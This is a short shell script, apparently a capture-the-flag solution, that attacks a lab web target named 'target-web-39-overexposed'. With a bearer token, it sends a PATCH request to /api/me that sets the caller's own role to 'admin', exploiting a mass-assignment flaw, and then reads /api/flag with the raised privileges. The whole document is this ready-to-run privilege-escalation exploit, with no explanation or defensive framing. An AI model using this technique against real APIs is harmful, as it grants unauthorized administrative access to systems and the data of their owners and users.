TARGET=${1:-target-web-39-overexposed}
PORT=${2:-5103}
TOKEN=$3
AUTH="Authorization: Bearer $TOKEN"
curl -s -X PATCH "http://$TARGET:$PORT/api/me" -H "$AUTH" -H 'Content-Type: application/json' -d '{"role":"admin"}'
curl -s "http://$TARGET:$PORT/api/flag" -H "$AUTH"
